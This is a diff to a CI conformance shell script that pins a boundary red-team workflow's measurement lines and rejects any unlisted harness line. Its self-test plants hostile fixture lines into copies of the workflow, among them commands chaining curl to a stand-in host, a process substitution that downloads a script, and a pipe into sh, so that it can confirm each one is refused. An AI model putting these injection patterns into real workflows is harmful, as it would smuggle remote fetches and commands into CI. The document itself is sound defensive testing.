@@ -807,7 +807,7 @@ check_boundary_redteam_step() {  # <workflow-file> -> 0 ok; 1 the job is absent,
 # Its name prefix and its `if:` line are pinned by check_boundary_redteam_step (the seventh prefix); this pins the rest: exactly one such step, exactly two run lines naming
 # `--measure C42...` (the graded loop and the SWAS-497 report-only literal control), and a `run: |` body that is the 16 lines below, byte for byte (the BR17 / H2 method). The step is a MEASUREMENT: an OPEN cell is its finding, so a leg's
 # exit 1 is not a failure, but the leg's output is graded by the harness's own `--leg-verdict` (an exit above 1, any INCONCLUSIVE C42 line, an INCONCLUSIVE C73k line, or a wrong
-# count of C42 plus C73 lines fails: 21 since SWAS-473 appended the fourteen report-only C73 cells to the same --measure list; the other C73 cells are warnings on Linux), so
+# count of C42 plus C73 lines fails: 24 since SWAS-473 appended the seventeen report-only C73 cells to the same --measure list; the other C73 cells are warnings on Linux), so
 # one OPEN cell cannot hide a VOID one; a `|| true`, an early exit or a removed grade would turn every red into a green, so no other line is accepted. Exactly three
 # `--measure` run lines may exist in the job (this step's two and the SWAS-404 candidate's), so an extra, unpinned measurement line reds too.
 check_c42_step() {  # <workflow-file> -> 0 ok; 1 the step is absent, doubled, or its body or run line deviates
@@ -822,9 +822,9 @@ check_c42_step() {  # <workflow-file> -> 0 ok; 1 the step is absent, doubled, or
           for s in .claude/settings.json "$RUNNER_TEMP/c42/candidate.json" "$RUNNER_TEMP/c42/candidate-desc.json"; do
             echo "C42 leg: $s"
             rc=0
-            sh conformance/boundary-redteam.sh --settings "$s" --measure C42,C42b,C42c,C42L,C42h,C42x,C42s,C73k,C73T,C73Tw,C73b0,C73g,C73g2,C73gt,C73s,C73d,C73r,C73w,C73c,C73m,C73u > "$RUNNER_TEMP/c42/leg.out" 2>&1 || rc=$?
+            sh conformance/boundary-redteam.sh --settings "$s" --measure C42,C42b,C42c,C42L,C42h,C42x,C42s,C73k,C73T,C73Tw,C73b0,C73g,C73g2,C73gt,C73s,C73d,C73r,C73w,C73c,C73m,C73u,C73b,C73h,C73F > "$RUNNER_TEMP/c42/leg.out" 2>&1 || rc=$?
             cat "$RUNNER_TEMP/c42/leg.out"
-            sh conformance/boundary-redteam.sh --leg-verdict "$rc" "$RUNNER_TEMP/c42/leg.out" 21 || bad=1
+            sh conformance/boundary-redteam.sh --leg-verdict "$rc" "$RUNNER_TEMP/c42/leg.out" 24 || bad=1
           done
           echo "SWAS-497 literal-path positive control (report-only, never gates)"
           sh conformance/boundary-redteam.sh --settings "$RUNNER_TEMP/c42/candidate-literal.json" --measure C42 || :
@@ -875,7 +875,7 @@ C42BODY
 # inside the checkout step's own with:; every action pinned by a 40-hex SHA, checkout and setup-node the SAME pins as the Linux boundary-redteam job (flow-style and quoted keys are refused outside
 # run: bodies, and the pin scan counts every spelling of uses:); no shell:/working-directory:/defaults: key, no GITHUB_ENV or BASH_ENV, GITHUB_PATH only as the one rg line, and the ONE env: key
 # is the profile resolver's PROFILE (pinned exactly: the input reaches the shell only there, and only as the subject of a case); every step pinned as an exact line sequence (the resolver's arms by
-# shape: a literal cell list per profile, an unknown profile exits 1); the report-only extras end `|| :` on the macOS-only allowlist and that step's run body is an exact line sequence (the only line a slice may add is a candidate line matching the positive allowlist: ten spaces, 'sh conformance/boundary-redteam.sh', plain args with at least one '--<id>-candidate' and no '--measure' ('--settings' only to a "$RUNNER_TEMP/....json"), optionally ' > "$RUNNER_TEMP/macos-out/<name>.out" 2>&1' with a name that is not leg-* or c42r.out in any case, then ' || :'). PARITY: the `full` arm's cell set equals the Linux temp-root
+# shape: a literal cell list per profile, an unknown profile exits 1); the report-only extras end `|| :` on the macOS-only allowlist and that step's run body is an exact line sequence (seven fixed lines, then the eight generated SWAS-564 lines; generic candidate lines only after them (BRMO); --c73-candidate and c73-* reserved (BRMZ, BRMG); the only line a slice may add is a generic candidate line matching the positive allowlist: ten spaces, 'sh conformance/boundary-redteam.sh', plain args with at least one '--<id>-candidate' and no '--measure' ('--settings' only to a "$RUNNER_TEMP/....json"), optionally ' > "$RUNNER_TEMP/macos-out/<name>.out" 2>&1' with a name that is not leg-*, c42r.out or c73-* in any case, then ' || :'). PARITY: the `full` arm's cell set equals the Linux temp-root
 # step's graded set (the allowlist id C42R excluded) and every other arm is a subset of `full`. HONEST CEILING: line-based, not a YAML parser; it proves the TEXT, not what GitHub resolves, and a green
 # here says nothing about what a macOS run reads.
 check_boundary_macos_leg() {  # <ci.yml> <macos workflow> -> 0 ok; 1 the file is absent, or a pin or a parity rule is broken
@@ -1072,29 +1072,48 @@ S4BODY
 S5BODY
   # the extras: the step's name and if: are exact; every harness line in the step ends '|| :' and is on the macOS-only allowlist (C42 literal control, C42R alone, a --*-candidate line), AND the
   # step's whole run body is pinned below as an exact line sequence: the 'run: |' line and its seven fixed lines (mkdir, the C42R echo header, the C42R harness line, the cat, the summary line, the
-  # literal-control echo header, the literal-control harness line) verbatim, plus only candidate lines (dropped before the compare ONLY when the whole line matches the positive allowlist stated at the filter below:
-  # a '--<id>-candidate' harness line with plain args, at most one fresh macos-out redirect, ending '|| :'). Any other line (bash or sh ./ spellings, curl, a second control, a chained command, a process substitution,
-  # a heredoc, a foreign redirect, --measure) is refused. The compare is the whole step text, not a scan for known-bad spellings.
+  # literal-control echo header, the literal-control harness line) verbatim, then the eight generated SWAS-564 lines; generic candidate lines only after them (BRMO); --c73-candidate and c73-* reserved (BRMZ, BRMG).
+  # Generic candidate lines are dropped before the compare ONLY when the whole line matches the positive allowlist stated at the filter below:
+  # a '--<id>-candidate' harness line with plain args, at most one fresh macos-out redirect, ending '|| :'. Any other line (bash or sh ./ spellings, curl, a second control, a chained command, a process substitution,
+  # a heredoc, a foreign redirect, a --measure that is not one of the eight generated lines) is refused. The compare is the whole step text, not a scan for known-bad spellings.
   _bm_s6=$(_bm_step '      - name: macOS boundary red-team — report-only extras')
   _bm_chk "report-only extras step's name and if: lines" "$(printf '%s\n' "$_bm_s6" | sed -n 1,2p)" <<'S6HEAD' || return 1
-      - name: macOS boundary red-team — report-only extras (C42R alone, the SWAS-497 literal control; never gates)
+      - name: macOS boundary red-team — report-only extras (C42R alone, the SWAS-497 literal control, the SWAS-564 C73 candidates; never gates)
         if: ${{ !cancelled() }}
 S6HEAD
-  # the bad-line scan ends with a sentinel line, so an awk that died (empty capture) cannot read as "no bad line"
-  _bm_xb=$(printf '%s\n' "$_bm_s6" | awk '/^ +sh conformance\/boundary-redteam[.]sh/ { ok = ($0 ~ /[ ][|][|] :[ ]*$/) && ($0 ~ /--measure C42R? / || $0 ~ /-candidate/); if (!ok) print } END { print "ok" }')  # BRMD
+  # SWAS-564: the eight pinned C73 candidate lines are GENERATED, never typed here twice. L (the cells measured) is the full arm's C73 ids in arm order (BRML), so a C73 cell added to full reds the
+  # extras body until the eight lines carry it. For x in A A1 B D (BRMP), y its lower case: the build line (the harness prints the candidate settings), then the measure line of that file.
+  _bm_nl='
+'
+  _bm_cl=$(printf '%s\n' "$_bm_s4" | awk '/^            full\) cells=/ { l = $0; sub(/^.*cells=/, "", l); sub(/ ;;.*$/, "", l); n = split(l, a, ","); o = ""; for (i = 1; i <= n; i++) if (a[i] ~ /^C73/) o = (o == "" ? a[i] : o "," a[i]); print o }')  # BRML
+  if [ -z "$_bm_cl" ]; then
+    echo "FAIL: $_bm_f the full profile carries no C73 cell, or the C73 scan could not be read: the eight pinned SWAS-564 C73 candidate lines have nothing to measure" >&2; return 1
+  fi
+  _bm_c73=
+  for _bm_x in A A1 B D; do  # BRMP
+    _bm_y=$(printf '%s' "$_bm_x" | tr 'A-Z' 'a-z')
+    _bm_c73="${_bm_c73:+$_bm_c73$_bm_nl}          sh conformance/boundary-redteam.sh --c73-candidate $_bm_x --settings .claude/settings.json > \"\$RUNNER_TEMP/c73/$_bm_y.json\" || :$_bm_nl          sh conformance/boundary-redteam.sh --settings \"\$RUNNER_TEMP/c73/$_bm_y.json\" --measure $_bm_cl > \"\$RUNNER_TEMP/macos-out/c73-$_bm_y.out\" 2>&1 || :"
+  done
+  _bm_c73t=$(printf '%s\n' "$_bm_c73" | tr '\n' '\t')   # the pinned lines, tab-joined, for the awk scans (a tab is in none of them)
+  # the bad-line scan ends with a sentinel line, so an awk that died (empty capture) cannot read as "no bad line". A harness line is admitted by shape (below) or by being EXACTLY one of the eight pinned lines.
+  _bm_xb=$(printf '%s\n' "$_bm_s6" | awk -v pins="$_bm_c73t" 'BEGIN { n = split(pins, p, "\t"); for (i = 1; i <= n; i++) if (p[i] != "") pin[p[i]] = 1 } /^ +sh conformance\/boundary-redteam[.]sh/ { ok = ($0 in pin) || (($0 ~ /[ ][|][|] :[ ]*$/) && ($0 ~ /--measure C42R? / || $0 ~ /-candidate/)); if (!ok) print } END { print "ok" }')  # BRMD
   _bm_xn=$(printf '%s\n' "$_bm_s6" | awk '/^ +sh conformance\/boundary-redteam[.]sh/ { n++ } END { print n + 0 }')  # BRMC
   if ! [ "$_bm_xn" -ge 0 ] 2>/dev/null; then  # BRMN
     echo "FAIL: $_bm_f the report-only extras count could not be read (the counting awk returned [$_bm_xn], want a non-negative integer)" >&2; return 1
   fi
   if [ "$_bm_xb" != ok ] || [ "$_bm_xn" -lt 2 ]; then  # BRMX
-    echo "FAIL: $_bm_f every report-only extra of the macOS workflow must end '|| :' and be on the macOS-only allowlist (--measure C42, --measure C42R, or a --*-candidate line), and the C42R line and the literal control must be present; first problem: $(printf '%s\n' "$_bm_xb" | sed '$d' | sed -n 1p | sed 's/^ *//') (extras=$_bm_xn)" >&2; return 1
+    echo "FAIL: $_bm_f every report-only extra of the macOS workflow must end '|| :' and be on the macOS-only allowlist (--measure C42, --measure C42R, a --*-candidate line, or one of the eight pinned SWAS-564 C73 candidate lines), and the C42R line and the literal control must be present; first problem: $(printf '%s\n' "$_bm_xb" | sed '$d' | sed -n 1p | sed 's/^ *//') (extras=$_bm_xn)" >&2; return 1
   fi
-  # the run body, exact: candidate lines (the one shape a slice may add) are dropped, then the remaining lines must equal the run: line and the seven fixed lines, in order. An awk that died leaves the text empty, which is not equal.
-  # A candidate line is a POSITIVE allowlist, anchored on the whole line (a line that is not exactly this shape stays in the body and BRMR refuses it): ten spaces, 'sh conformance/boundary-redteam.sh', then single-space-separated
-  # args, each '--word' (a flag; '--measure' is refused, '--settings' takes only a "$RUNNER_TEMP/....json" value), a bare token [A-Za-z0-9_.,/-]+, or a quoted "$RUNNER_TEMP/..." path, with at least one '--<id>-candidate' flag; then optionally
-  # ' > "$RUNNER_TEMP/macos-out/<name>.out" 2>&1' (case-insensitively NOT leg-*, which the graded step writes, and NOT c42r.out, which the C42R line writes); then ' || :' and the end of the line.
-  _bm_s6f=$(printf '%s\n' "$_bm_s6" | sed -n '3,$p' | awk '
+  # the run body, exact: generic candidate lines (the one shape a slice may add) are dropped, then the remaining lines must equal the run: line, the seven fixed lines and the eight generated SWAS-564 lines, in order (generic candidate lines only after them, BRMO; --c73-candidate and c73-* reserved, BRMZ, BRMG). An awk that died leaves the text empty, which is not equal.
+  # A generic candidate line is a POSITIVE allowlist, anchored on the whole line (a line that is not exactly this shape stays in the body and BRMR refuses it): ten spaces, 'sh conformance/boundary-redteam.sh', then single-space-separated
+  # args, each '--word' (a flag; '--measure' is refused here, so the eight pinned lines, which carry it, are never dropped by this filter; '--settings' takes only a "$RUNNER_TEMP/....json" value), a bare token [A-Za-z0-9_.,/-]+, or a quoted "$RUNNER_TEMP/..." path, with at least one '--<id>-candidate' flag; then optionally
+  # ' > "$RUNNER_TEMP/macos-out/<name>.out" 2>&1' (case-insensitively NOT leg-*, which the graded step writes, NOT c42r.out, which the C42R line writes, and NOT c73-*, which the pinned lines write); then ' || :' and the end of the line.
+  # SWAS-564: the filter NEVER drops a line carrying --c73-candidate or a /c73/ path in any case (BRMZ), so such a line stays in the body and reds at BRMR unless it is one of the eight pinned lines; the output name c73-* is
+  # reserved in any case (BRMG); and a generic candidate line that comes BEFORE a pinned line is flagged (BRMO), so the generic lines can only follow the pairs.
+  _bm_s6f=$(printf '%s\n' "$_bm_s6" | sed -n '3,$p' | awk -v pins="$_bm_c73t" '
+    BEGIN { n = split(pins, p, "\t"); for (i = 1; i <= n; i++) if (p[i] != "") pin[p[i]] = 1 }
     { keep = 1 }
+    ($0 in pin) && gen { bad = 1 }  # BRMO
     /^          sh conformance\/boundary-redteam[.]sh / && /[ ][|][|] :$/ {
       b = $0; sub(/ [|][|] :$/, "", b); ok = 1; nc = 0; prev = ""
       pre = " > \"$RUNNER_TEMP/macos-out/"
@@ -1104,7 +1123,7 @@ S6HEAD
         if (tl !~ /^[A-Za-z0-9_.-]+[.]out" 2>&1$/) ok = 0
         else {
           lo = tolower(tl); sub(/" 2>&1$/, "", lo)
-          if (lo ~ /^leg-/ || lo == "c42r.out") ok = 0  # BRMG
+          if (lo ~ /^leg-/ || lo == "c42r.out" || lo ~ /^c73-/) ok = 0  # BRMG
         }
         b = substr(b, 1, pos - 1)
       }
@@ -1123,12 +1142,19 @@ S6HEAD
         else { ok = 0 }  # BRMT
       }
       if (prev == "--settings" || nc < 1) ok = 0
-      if (ok) keep = 0
+      if (tolower($0) ~ /--c73-candidate|\/c73\//) ok = 0  # BRMZ
+      if (ok) { keep = 0; gen = 1 }
     }
-    keep { print }')
-  _bm_chk "report-only extras step's run body (its seven fixed lines; only a '--<id>-candidate ... || :' harness line may be added; no bash, sh ./, curl or other line)" "$_bm_s6f" <<'S6BODY' || return 1  # BRMR
+    keep { print }
+    END { if (bad) print "BRMO-VIOLATION" }')
+  case "$_bm_s6f" in
+    *BRMO-VIOLATION*)
+      echo "FAIL: $_bm_f a generic --*-candidate line of the report-only extras step comes before a pinned SWAS-564 C73 line: generic candidate lines may only follow the last pinned C73 line (BRMO)" >&2; return 1 ;;
+  esac
+  _bm_s6w() {  # the extras run body, exact: the run: line and the seven fixed lines (the mkdir also makes the c73 directory), then the eight pinned SWAS-564 C73 candidate lines
+    cat <<'S6BODY'
         run: |
-          mkdir -p "$RUNNER_TEMP/c42" "$RUNNER_TEMP/macos-out"
+          mkdir -p "$RUNNER_TEMP/c42" "$RUNNER_TEMP/macos-out" "$RUNNER_TEMP/c73"
           echo "C42R real-path cell, alone (report-only)"
           sh conformance/boundary-redteam.sh --settings .claude/settings.json --measure C42R > "$RUNNER_TEMP/macos-out/c42r.out" 2>&1 || :
           cat "$RUNNER_TEMP/macos-out/c42r.out"
@@ -1136,6 +1162,11 @@ S6HEAD
           echo "SWAS-497 literal-path positive control (report-only, never gates)"
           sh conformance/boundary-redteam.sh --settings "$RUNNER_TEMP/c42/candidate-literal.json" --measure C42 || :
 S6BODY
+    printf '%s\n' "$_bm_c73"
+  }
+  _bm_chk "report-only extras step's run body (its seven fixed lines, then the eight pinned SWAS-564 C73 candidate lines; only a generic '--<id>-candidate ... || :' harness line may be added after them; no bash, sh ./, curl or other line)" "$_bm_s6f" <<S6EXP || return 1  # BRMR
+$(_bm_s6w)
+S6EXP
   _bm_chk "artifact upload step (pinned by SHA, retention-days: 7)" "$(_bm_step '      - name: Upload the macOS readings')" <<'S7BODY' || return 1
       - name: Upload the macOS readings (7 days)
         if: ${{ !cancelled() }}
@@ -1380,7 +1411,7 @@ own_tree_run() {  # [<root>]  (default .)
   if [ "$_ot_kit" = 1 ]; then  # SWAS-274: the kit's own PR-cancel lock (kit-tree guard; adopters carry no such block)
     check_line_breaks_tree "$_ot_root" || _ot_rc=1  # SWAS-447: first, so a hidden line break is named before any LF-split lock below is trusted
     for _ot_cw in ci.yml golden-path.yml; do
-      # a missing file is skipped on purpose: golden-path-filter-parity.sh also treats an absent golden-path.yml as N/A
+      # a missing file is skipped on purpose: the golden-path workflow is kit-tree only and may be absent
       [ -f "$_ot_root/.github/workflows/$_ot_cw" ] || continue
       check_pr_concurrency "$_ot_root/.github/workflows/$_ot_cw" || _ot_rc=1
     done
@@ -1388,7 +1419,7 @@ own_tree_run() {  # [<root>]  (default .)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_sast_parse_spans "$_ot_root/.github/workflows/ci.yml" || _ot_rc=1  # SWAS-278: the SAST-parse spans line (SP)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_guard_delta_step "$_ot_root/.github/workflows/ci.yml" || _ot_rc=1  # SWAS-301: the guard delta step (GD)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_boundary_redteam_step "$_ot_root/.github/workflows/ci.yml" || _ot_rc=1  # SWAS-359: the boundary red-team job (BR)
-    [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_boundary_macos_leg "$_ot_root/.github/workflows/ci.yml" "$_ot_root/.github/workflows/$KIT_MACOS_WORKFLOW" || _ot_rc=1  # SWAS-552: the on-demand macOS boundary workflow (BR0m, BR53-BR116)
+    [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_boundary_macos_leg "$_ot_root/.github/workflows/ci.yml" "$_ot_root/.github/workflows/$KIT_MACOS_WORKFLOW" || _ot_rc=1  # SWAS-552: the on-demand macOS boundary workflow (BR0m, BR53-BR132)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_h2_defer_step "$_ot_root/.github/workflows/ci.yml" || _ot_rc=1  # SWAS-376: the H2 step's battery defer (H2D)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_core_face_graders "$_ot_root" || _ot_rc=1  # SWAS-460: every core-only hermetic target has a diff-gated full grader (CG)
     [ ! -f "$_ot_root/.github/workflows/ci.yml" ] || check_shard_join_shape "$_ot_root/.github/workflows/ci.yml" conformance-docs || _ot_rc=1  # SWAS-409: the docs shard (C30, C31) is graded live in every docs leg
@@ -1578,7 +1609,10 @@ check_shellcheck_pin_tree() {  # <root> -> 0 ok; 1 a linting job without its pin
 # docs-only change-set cannot have touched ci.yml, so there is no new mention for the census to grade.
 # 29 -> 32 on 2026-10-29 (SWAS-499): the pinned-shellcheck install, its --check and the GNU time probe. THE LOOK THE PIN FORCES: none of the three carries a
 # step-level `if:`; conformance-core's job-level lane condition governs them, which is right (a docs-only change-set runs no lint, so it needs no pinned binary).
-_AGG_CC_STEP_PIN=32
+# 32 -> 28 (SWAS-626): four steps leave (operate-loop-wired, adopter-preflight-wired, golden-path-wired, golden-path-filter-parity); none was a classification decision, they were wiring locks.
+# 28 -> 27 on 2026-11-02 (SWAS-619): the Tier-advice-wired regression-lock step leaves with its script. THE LOOK THE PIN FORCES: a step went, none was added, so no
+# step-level `if:` needs a look; conformance-core's job-level lane condition is unchanged.
+_AGG_CC_STEP_PIN=27
 _agg_marker='not a required check -> a job-level skip is safe'
 
 # _agg_job_step_count <yml> <job> -> the count of top-level (6-space `- `) step entries under
@@ -1877,7 +1911,7 @@ count_legs_run() {  # <root> -> 0 ok; 1 a refusal (FAIL lines on stdout)
 #        gate-test id: reaching it attests every join check, which attest every leg (extends OT15 in the KIT section of the selftest).
 # HONEST CEILING: line-based awk at the indents the kit's workflows use (jobs at 2, steps at 6, step keys at 8), the same as the rest of this file; it
 # is not a YAML parser. extract_job_block is the one extractor (no second parser); _sj_blk only cuts its output at a job header that carries a comment.
-_SJ_DOCS_PIN=59   # T0 (SWAS-409 plan §2.6): the 61 docs steps minus the checkout and the jq probe. Adding or removing a docs step reds until this moves, by a deliberate control-plane edit.
+_SJ_DOCS_PIN=58   # T0 (SWAS-409 plan §2.6): the 61 docs steps minus the checkout and the jq probe; SWAS-627 removed one docs step (59 -> 58). Adding or removing a docs step reds until this moves, by a deliberate control-plane edit.
 _sj_marker='not a required check -> a job-level skip is safe'
 _sj_fail() { echo "FAIL: shard-join — $*"; _sj_bad=1; }
 _sj_blk() {  # <wf> <job> -> the job's lines, cut at the next 2-space job header even when that header carries a trailing comment
@@ -3559,10 +3593,10 @@ selftest() {
       # BR42-BR52 (SWAS-471; BR52 is SWAS-497's report-only literal control made gating): the temp-root git measurement step (renumbered from BR32-BR41 at the merge of SWAS-460, which took BR32/BR33). Each mutant is a scratch copy of the real ci.yml and must red AND name its cause.
       awk '/^      - name: Boundary red-team — temp-root git cells/ { skip = 1; next } skip && /^      - / { skip = 0 } skip && /^  [a-z]/ { skip = 0 } !skip' "$_br_real" > "$d/br/m42.yml"
       sed 's/leg\.out" 2>&1 || rc=\$?/leg.out" 2>\&1 || true/' "$_br_real" > "$d/br/m43.yml"
-      sed 's/ 21 || bad=1$/ 21/' "$_br_real" > "$d/br/m44.yml"
-      sed 's/--measure C42,C42b,C42c,C42L,C42h,C42x,C42s,C73k,C73T,C73Tw,C73b0,C73g,C73g2,C73gt,C73s,C73d,C73r,C73w,C73c,C73m,C73u >/--measure C42 >/' "$_br_real" > "$d/br/m45.yml"
+      sed 's/ 24 || bad=1$/ 24/' "$_br_real" > "$d/br/m44.yml"
+      sed 's/--measure C42,C42b,C42c,C42L,C42h,C42x,C42s,C73k,C73T,C73Tw,C73b0,C73g,C73g2,C73gt,C73s,C73d,C73r,C73w,C73c,C73m,C73u,C73b,C73h,C73F >/--measure C42 >/' "$_br_real" > "$d/br/m45.yml"
       sed '/--leg-verdict "\$rc"/d' "$_br_real" > "$d/br/m49.yml"
-      sed 's/leg\.out" 21 || bad=1$/leg.out" 20 || bad=1/' "$_br_real" > "$d/br/m50.yml"
+      sed 's/leg\.out" 24 || bad=1$/leg.out" 23 || bad=1/' "$_br_real" > "$d/br/m50.yml"
       awk '/^      # The full self-test with all/ { print "      - name: Extra measurement line"; print "        run: |"; print "          sh conformance/boundary-redteam.sh --settings x.json --measure C1" } { print }' "$_br_real" > "$d/br/m51.yml"
       sed 's/candidate-literal\.json" --measure C42 || :$/candidate-literal.json" --measure C42 || bad=1/' "$_br_real" > "$d/br/m52.yml"
       sed '/candidate-desc\.json"$/d' "$_br_real" > "$d/br/m46.yml"
@@ -3648,7 +3682,7 @@ selftest() {
       # second GITHUB_PATH write, BR70 the profile input on a run line. Resolver: BR71 PROFILE env renamed, BR72 the unknown-profile arm exits 0, BR75 a subset-rule breach. Parity: BR73 a cell dropped from full,
       # BR74 a cell added on the Linux side only. Graded body: BR76 a leg dropped, BR77 a constant exit code graded, BR78 bad=1 at the start, BR79 exit before the loop, BR80 a stray exit 0, BR81 a changed step if:.
       # Extras: BR82 the mask dropped, BR83 the step if: changed, BR84 an unlisted harness line. Others: BR85 retention-days removed, BR86 the ripgrep checksum altered, BR87 the jq presence check removed, BR89 a second
-      # job appended, BR90 the file absent. Extras run body (fix round 2): BR99 a bash-spelled line, BR100 an sh ./ line, BR101 a curl line, BR102 a chained command on a candidate-shaped line, BR103 the clean candidate line stays green. Candidate-line allowlist (fix round 4): BR104 a single &, BR105 <(, BR106 >(, BR107 an unclosed heredoc, BR108 a redirect into leg-1.out, BR109 >> the step summary, BR110 --measure, BR111 a backtick, BR112 a dollar-paren, BR113 a pipe, BR114 &&, BR115 a redirect into C42R.out (other case), each with its -M mutant (BRMT/BRMM/BRMG rule tags); BR116 a fresh macos-out redirect stays green.
+      # job appended, BR90 the file absent. Extras run body (fix round 2): BR99 a bash-spelled line, BR100 an sh ./ line, BR101 a curl line, BR102 a chained command on a candidate-shaped line, BR103 the clean candidate line stays green. Candidate-line allowlist (fix round 4): BR104 a single &, BR105 <(, BR106 >(, BR107 an unclosed heredoc, BR108 a redirect into leg-1.out, BR109 >> the step summary, BR110 --measure, BR111 a backtick, BR112 a dollar-paren, BR113 a pipe, BR114 &&, BR115 a redirect into C42R.out (other case), each with its -M mutant (BRMT/BRMM/BRMG rule tags); BR116 a fresh macos-out redirect stays green. SWAS-564 (the eight pinned C73 candidate lines): BR117-BR132, each load-bearing cell with its -M mutant (see the BR117-BR132 block below).
       mkdir -p "$d/bm"
       _bq_mac="$_kr/.github/workflows/$KIT_MACOS_WORKFLOW"
       _bq_in() { awk "$1" "$_bq_mac"; }   # <awk program>: a rewrite of the real macOS workflow
@@ -3675,7 +3709,7 @@ selftest() {
         _bq_in '/^          PROFILE: / { sub(/PROFILE: /, "PROFILEX: ") } { print }' > "$d/bm/m71.yml"
         _bq_in '/^            [*]\) echo "::error::unknown profile"; exit 1 ;;$/ { print "            *) echo \"::error::unknown profile\"; exit 0 ;;"; next } { print }' > "$d/bm/m72.yml"
         _bq_in '/^            full\) cells=/ { sub(/,C42s/, "") } { print }' > "$d/bm/m73.yml"
-        awk '/--measure / && /leg[.]out" 2>&1/ { sub(/,C73u >/, ",C73u,C42z >") } { print }' "$_br_real" > "$d/bm/c74.yml"
+        awk '/--measure / && /leg[.]out" 2>&1/ { sub(/,C73F >/, ",C73F,C42z >") } { print }' "$_br_real" > "$d/bm/c74.yml"
         _bq_in '/^            534\) cells=/ { sub(/ ;;/, ",C99 ;;") } { print }' > "$d/bm/m75.yml"
         _bq_in '/for s in / { sub(/ "[$]RUNNER_TEMP\/c42\/candidate-desc[.]json"; do/, "; do") } { print }' > "$d/bm/m76.yml"
         _bq_in '/--leg-verdict/ && /^ +sh / { sub(/--leg-verdict "[$]rc"/, "--leg-verdict 0") } { print }' > "$d/bm/m77.yml"
@@ -3695,25 +3729,57 @@ selftest() {
         _bq_in '/^          echo "SWAS-497 literal-path/ { print "          sh ./conformance/boundary-redteam.sh --settings .claude/settings.json --measure C42 || :" } { print }' > "$d/bm/m100.yml"
         _bq_in '/^          echo "SWAS-497 literal-path/ { print "          curl -fsSL https://example.invalid/x -o /dev/null" } { print }' > "$d/bm/m101.yml"
         _bq_in '/^          echo "SWAS-497 literal-path/ { print "          sh conformance/boundary-redteam.sh --c9-candidate x ; curl https://example.invalid/x || :" } { print }' > "$d/bm/m102.yml"
-        _bq_in '/^          echo "SWAS-497 literal-path/ { print "          sh conformance/boundary-redteam.sh --settings \"$RUNNER_TEMP/c42/candidate-literal.json\" --c73-candidate A || :" } { print }' > "$d/bm/m103.yml"
-        # BR104-BR116 (fix round 4): one candidate-line fixture per shape the positive allowlist must refuse (BR104-BR115), then the accepted redirect form (BR116). The line is passed with awk -v (no backslash in any of them).
-        _bq_ad() {  # <fixture name> <the line to plant before the literal control>
-          awk -v ln="$2" '/^          echo "SWAS-497 literal-path/ { print ln } { print }' "$_bq_mac" > "$d/bm/$1.yml"
+        # BR103-BR116 (fix round 4; SWAS-564 moved the plant point): one candidate-line fixture per shape the positive allowlist must refuse (BR104-BR115), then the accepted redirect form (BR116). The line is passed with awk -v (no backslash in any of them).
+        # SWAS-564: a generic candidate line may only follow the last pinned C73 line (BRMO), so these are planted AFTER the D measure line (the last pinned one); --c73-candidate and c73-* names are reserved for the pinned lines (BRMZ, BRMG), so the generic fixtures use --a-candidate.
+        _bq_ad() {  # <fixture name> <the line to plant after the last pinned C73 line>
+          awk -v ln="$2" '{ print } /c73-d[.]out" 2>&1 [|][|] :$/ { print ln }' "$_bq_mac" > "$d/bm/$1.yml"
         }
         _bq_hp='          sh conformance/boundary-redteam.sh'
+        _bq_ad m103 "$_bq_hp --settings \"\$RUNNER_TEMP/c42/candidate-literal.json\" --a-candidate A || :"
         _bq_ad m104 "$_bq_hp --a-candidate b & curl https://example.invalid/x || :"
         _bq_ad m105 "$_bq_hp --settings <(curl -o x.sh https://example.invalid/x) --a-candidate b || :"
         _bq_ad m106 "$_bq_hp --a-candidate b >(curl https://example.invalid/x) || :"
         _bq_ad m107 "$_bq_hp --a-candidate b <<EOF || :"
         _bq_ad m108 "$_bq_hp --a-candidate b > \"\$RUNNER_TEMP/macos-out/leg-1.out\" 2>&1 || :"
         _bq_ad m109 "$_bq_hp --a-candidate b >> \"\$GITHUB_STEP_SUMMARY\" || :"
-        _bq_ad m110 "$_bq_hp --measure C36 --c73-candidate A || :"
+        _bq_ad m110 "$_bq_hp --measure C36 --a-candidate A || :"
         _bq_ad m111 "$_bq_hp --a-candidate b \`curl https://example.invalid/x\` || :"
         _bq_ad m112 "$_bq_hp --a-candidate \"\$(curl https://example.invalid/x)\" || :"
         _bq_ad m113 "$_bq_hp --a-candidate b | sh || :"
         _bq_ad m114 "$_bq_hp --a-candidate b && curl https://example.invalid/x || :"
         _bq_ad m115 "$_bq_hp --a-candidate b > \"\$RUNNER_TEMP/macos-out/C42R.out\" 2>&1 || :"
-        _bq_ad m116 "$_bq_hp --c73-candidate A > \"\$RUNNER_TEMP/macos-out/c73-a.out\" 2>&1 || :"
+        _bq_ad m116 "$_bq_hp --a-candidate A > \"\$RUNNER_TEMP/macos-out/a-fresh.out\" 2>&1 || :"
+        # BR117-BR132 (SWAS-564): the eight pinned C73 candidate lines. BR117 is the real body (positive; its -M makes the generator emit no pair). BR118 a pair broken three ways (D dropped; a pair's two lines swapped; A built into b.json). BR119 the full arm gains C73z
+        # (the measured list is derived). BR120/BR121/BR122 a --c73-candidate or /c73/ line the generic rule would accept (plain; with a redirect; an upper-case path). BR123 an M line with C42R, prefixed. BR124 a generic line writing c73-a.out.
+        # BR125 a valid generic line between the literal control and the first pair. BR126-BR132 regression cells of the existing clauses on a hostile pair line.
+        _bq_in '/c73\/d[.]json/ { next } { print }' > "$d/bm/m118.yml"
+        _bq_in '/--c73-candidate A / { h = $0; next } /c73-a[.]out/ { print; print h; next } { print }' > "$d/bm/m118b.yml"
+        _bq_in '/--c73-candidate B / { sub(/--c73-candidate B /, "--c73-candidate A ") } { print }' > "$d/bm/m118c.yml"
+        _bq_in '/^            full\) cells=/ { sub(/ ;;/, ",C73z ;;") } { print }' > "$d/bm/m119.yml"
+        _bq_ad m120 "$_bq_hp --c73-candidate A --settings \"\$RUNNER_TEMP/c73/b.json\" || :"
+        _bq_ad m121 "$_bq_hp --c73-candidate A --settings \"\$RUNNER_TEMP/c73/b.json\" > \"\$RUNNER_TEMP/macos-out/x.out\" 2>&1 || :"
+        _bq_ad m122 "$_bq_hp --x-candidate --settings \"\$RUNNER_TEMP/C73/y.json\" || :"
